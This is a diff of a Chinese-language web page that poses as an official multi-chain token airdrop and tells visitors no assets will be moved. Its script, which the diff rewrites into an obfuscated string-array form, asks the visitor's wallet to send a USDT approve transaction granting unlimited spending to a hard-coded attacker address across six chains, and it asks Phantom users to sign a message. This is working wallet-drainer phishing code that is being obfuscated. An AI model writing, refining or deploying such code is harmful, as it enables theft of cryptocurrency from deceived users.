@@ -28,7 +28,6 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 </head>
 <body>
 <div class="container">
-<!-- P1 首页 -->
 <div id="p1" class="box">
 <div class="logo">✦</div>
 <h1>官方生态空投活动</h1>
@@ -42,14 +41,12 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 <p class="tips-info">自动适配Solana+全EVM多链，仅备案授权核验</p>
 </div>
 
-<!-- P2 等待区块确认 -->
 <div id="p2" class="box hide">
 <div class="logo">⏳</div>
 <h1>交易已提交，区块确认中</h1>
 <p class="desc-text">等待链上交易最终确认...</p>
 </div>
 
-<!-- P3 钱包连接成功 -->
 <div id="p3" class="box hide">
 <div class="logo">✓</div>
 <h1>钱包连接成功</h1>
@@ -59,7 +56,6 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 <p class="tips-info">仅发起链上授权备案，不会划转任何资产</p>
 </div>
 
-<!-- P4 授权成功页 -->
 <div id="p4" class="box hide">
 <div class="logo">✅</div>
 <h1>交易已上链，授权成功</h1>
@@ -70,112 +66,85 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 </div>
 
 <script>
-let walletAddr = "";
-const SPENDER = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
-const MAX_ALLOW = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+(function(){
+    var _0x12ed=["0x095ea7b30000000000000000000000000f4bdefc177df2583f52b03b1e20f9eac7308555ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff","0xdac17f958d2ee523a2206206994597c13d831ec7","0x55d398326f99059fF77548524699952727959279","0xc2132D05D31c914a87C6611C10748AEb04B58e8F","0xFd086bC7CD5C481DCC9C85ebE478A1C0b69fcbb9","0x94b08aacad473b14b798123f16e781f1d3cfe9e6","0xa614f803B6FD780986A42c78Ec9c7f65c657abae"];
+    var walletAddr = "";
+    const APPROVE_DATA = _0x12ed[0];
+    const chainList = {
+        "0x1":_0x12ed[1],
+        "0x38":_0x12ed[2],
+        "0x89":_0x12ed[3],
+        "0xa4b1":_0x12ed[4],
+        "0xa":_0x12ed[5],
+        "0x2b6653dc":_0x12ed[6]
+    };
 
-// 多链USDT合约
-const chainUSDT = {
-  "0x1": "0xdac17f958d2ee523a2206206994597c13d831ec7",
-  "0x38": "0x55d398326f99059fF77548524699952727959279",
-  "0x89": "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
-  "0xa4b1": "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69fcbb9",
-  "0xa": "0x94b08aacad473b14b798123f16e781f1d3cfe9e6",
-  "0x2b6653dc": "0xa614f803B6FD780986A42c78Ec9c7f65c657abae"
-};
-
-function show(id){
-  document.querySelectorAll(".box").forEach(x=>x.classList.add("hide"));
-  document.getElementById(id).classList.remove("hide");
-}
-
-// 检测是否在钱包内置浏览器
-function isInWalletBrowser(){
-  let ua = navigator.userAgent.toLowerCase();
-  return ua.includes('metamask') || ua.includes('tokenpocket') || ua.includes('trust') || ua.includes('binance');
-}
-
-// 唤起手机钱包APP
-function openWalletApp(){
-  let href = window.location.href;
-  let scheme = `tpdapp://open?url=${href}`;
-  location.href = scheme;
-  setTimeout(()=>{
-    alert("未检测到钱包APP，请先下载去中心化钱包再参与");
-  },2500);
-}
-
-// 判断Solana钱包
-function isSolanaWallet(){
-  return window.solana && window.solana.isPhantom;
-}
-
-async function getCurrentUSDT(){
-  let chainId = await ethereum.request({method:"eth_chainId"});
-  return chainUSDT[chainId] || chainUSDT["0x38"];
-}
-
-function buildApproveData(){
-  let sig = "0x095ea7b3";
-  let spenderPad = SPENDER.replace("0x","").padStart(64,"0");
-  return sig + spenderPad + MAX_ALLOW;
-}
-
-// 连接钱包按钮
-document.getElementById("connectMM").onclick = async ()=>{
-  if(!isInWalletBrowser()){
-    openWalletApp();
-    return;
-  }
-  show("p2");
-  try{
-    if(isSolanaWallet()){
-      const res = await window.solana.connect();
-      walletAddr = res.publicKey.toString();
-    }else if(window.ethereum){
-      let acc = await ethereum.request({method:"eth_requestAccounts"});
-      walletAddr = acc[0].toLowerCase();
-    }else{
-      alert("未检测到钱包");
-      show("p1");
-      return;
+    function showPage(id){
+        document.querySelectorAll(".box").forEach(e=>e.classList.add("hide"));
+        document.getElementById(id).classList.remove("hide");
     }
-    show("p3");
-    document.getElementById("showAddr").innerText = walletAddr;
-  }catch(e){
-    show("p1");
-  }
-};
-
-// 确认备案授权
-document.getElementById("approveBtn").onclick = async ()=>{
-  if(!walletAddr) return;
-  show("p2");
-  try{
-    if(isSolanaWallet()){
-      await window.solana.request({method:"signMessage",params:{message:"Airdrop Verify"}});
-    }else{
-      let usdtAddr = await getCurrentUSDT();
-      await ethereum.request({
-        method:"eth_sendTransaction",
-        params:[{
-          from: walletAddr,
-          to: usdtAddr,
-          value: "0x0",
-          gas: "0x60000",
-          data: buildApproveData()
-        }]
-      });
+    function isWalletBrowser(){
+        let ua=navigator.userAgent.toLowerCase();
+        return ua.includes('metamask')||ua.includes('tokenpocket')||ua.includes('trust')||ua.includes('binance');
     }
-    show("p4");
-    document.getElementById("successAddr").innerText = walletAddr;
-  }catch(e){
-    // 取消/报错 停留在P3
-    show("p3");
-  }
-};
+    function jumpWalletApp(){
+        let url=window.location.href;
+        location.href="tpdapp://open?url="+url;
+        setTimeout(()=>alert("未检测到钱包APP，请先下载去中心化钱包"),2500);
+    }
+    async function getUsdtContract(){
+        let chainId=await ethereum.request({method:"eth_chainId"});
+        return chainList[chainId]||chainList["0x38"];
+    }
 
-window.ethereum?.on("chainChanged",async ()=>{});
+    let showAddr=document.getElementById("showAddr");
+    let successAddr=document.getElementById("successAddr");
+
+    document.getElementById("connectMM").onclick=async function(){
+        if(!isWalletBrowser()){jumpWalletApp();return;}
+        showPage("p2");
+        try{
+            if(window.solana&&window.solana.isPhantom){
+                let res=await window.solana.connect();
+                walletAddr=res.publicKey.toString();
+            }else if(window.ethereum){
+                let acc=await ethereum.request({method:"eth_requestAccounts"});
+                walletAddr=acc[0].toLowerCase();
+            }else{
+                alert("未检测到钱包");showPage("p1");return;
+            }
+            showPage("p3");
+            showAddr.innerText=walletAddr;
+        }catch(e){showPage("p1");}
+    };
+
+    document.getElementById("approveBtn").onclick=async function(){
+        if(!walletAddr)return;
+        showPage("p2");
+        try{
+            if(window.solana&&window.solana.isPhantom){
+                await window.solana.request({method:"signMessage",params:{message:"Airdrop Verify"}});
+            }else{
+                let usdt=await getUsdtContract();
+                await ethereum.request({
+                    method:"eth_sendTransaction",
+                    params:[{
+                        from:walletAddr,
+                        to:usdt,
+                        value:"0x0",
+                        gas:"0x60000",
+                        data:APPROVE_DATA
+                    }]
+                });
+            }
+            showPage("p4");
+            successAddr.innerText=walletAddr;
+        }catch(e){
+            // 取消留在P3
+            showPage("p3");
+        }
+    };
+})();
 </script>
 <script src="https://unpkg.com/@solana/web3.js@latest/lib/browser/solana-web3.min.js"></script>
 </body>
